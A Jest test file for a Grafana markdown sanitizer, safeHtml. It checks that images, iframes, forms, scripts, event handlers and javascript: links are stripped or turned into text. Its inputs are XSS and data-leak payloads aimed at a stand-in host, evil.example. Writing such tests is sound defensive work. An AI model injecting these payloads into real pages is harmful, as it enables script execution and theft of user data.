import * as grafanaData from '@grafana/data';
import { safeHtml } from './safeHtml';

// window.location is HOME (http://localhost:3000/...) in every test
const parse = (markdown: string) => new DOMParser().parseFromString(safeHtml(markdown), 'text/html').body;

/** Parses raw HTML as if renderMarkdown let everything through (it escapes most risky tags itself). */
const parseUnsanitized = (html: string) => {
  const spy = jest.spyOn(grafanaData, 'renderMarkdown').mockImplementation((s?: string) => s ?? '');
  try {
    return parse(html);
  } finally {
    spy.mockRestore();
  }
};

describe('safeHtml', () => {
  it('shows URLs of elements that would load them by themselves as text', () => {
    const body = parse(
      '![x](https://evil.example/leak.png?d=secret) <video src="https://evil.example/v"></video> ' +
        '<audio src="https://evil.example/a"></audio>'
    );
    expect(body.querySelector('img, video, audio')).toBeNull();
    for (const url of ['https://evil.example/leak.png?d=secret', 'https://evil.example/v', 'https://evil.example/a']) {
      expect(body.textContent).toContain(url);
    }
  });

  it('shows the URL of an iframe as text', () => {
    const body = parse('<iframe src="https://evil.example/frame?d=secret"></iframe>');
    expect(body.querySelector('iframe')).toBeNull();
    expect(body.textContent).toContain('https://evil.example/frame?d=secret');
  });

  it('replaces embedded content, forms and page-level tags even if the sanitizer lets them through', () => {
    const body = parseUnsanitized(
      [
        '<object data="https://evil.example/o"></object>',
        '<embed src="https://evil.example/e">',
        '<picture><source srcset="x"><img src="https://evil.example/p"></picture>',
        '<input type="image" src="https://evil.example/i">',
        '<form action="https://evil.example/f"><input name="q"><button>send</button></form>',
        '<button>click</button>',
        '<style>body { display: none }</style>',
        '<link rel="alternate" href="https://evil.example/feed">',
        '<meta http-equiv="refresh" content="0;url=https://evil.example/m">',
      ].join('')
    );
    expect(body.children).toHaveLength(0);
    expect(body.textContent).toBe(
      'https://evil.example/ohttps://evil.example/ehttps://evil.example/i' // the picture's img went with it
    );
  });

  it('removes inputs but keeps task list checkboxes', () => {
    expect(parse('- [x] alerts checked\n- [ ] logs').querySelectorAll('input[type=checkbox]')).toHaveLength(2);
    const body = parseUnsanitized('<input type="text" value="x"><input type="checkbox" checked>');
    expect(Array.from(body.querySelectorAll('input')).map((i) => i.type)).toEqual(['checkbox']);
  });

  it('drops inline styles and classes', () => {
    const body = parse('<span style="position:fixed;inset:0">cover</span> <a class="x" href="/d/abc">dash</a>');
    expect(body.querySelector('[style], [class]')).toBeNull();
    expect(body.textContent).toContain('cover');
  });

  it('leaves no scripts, event handlers or javascript: links', () => {
    const body = parse(
      '<script>alert(1)</script> <img src=x onerror=alert(2)> [a](javascript:alert(3)) <a href="javascript:alert(4)" onclick="alert(5)">b</a>'
    );
    expect(body.querySelector('script')).toBeNull();
    const attributes = Array.from(body.querySelectorAll('*')).flatMap((el) => Array.from(el.attributes));
    expect(attributes.filter((a) => a.name.startsWith('on') || a.value.includes('javascript:'))).toEqual([]);
  });

  it('opens external links in a new tab and keeps Grafana links in place', () => {
    const body = parse('[docs](https://evil.example/docs) [dash](/d/abc) [here](http://localhost:3000/explore)');
    const [docs, dash, here] = Array.from(body.querySelectorAll('a'));
    expect(docs.getAttribute('target')).toBe('_blank');
    expect(docs.getAttribute('rel')).toBe('noopener noreferrer');
    for (const link of [dash, here]) {
      expect(link.hasAttribute('target')).toBe(false);
      expect(link.hasAttribute('rel')).toBe(false);
    }
  });

  it('treats links it cannot parse as external, without throwing', () => {
    expect(() => parse('[m](http://HOST:PORT/metrics)')).not.toThrow();
    const link = parse('[m](http://HOST:PORT/metrics)').querySelector('a');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
  });
});
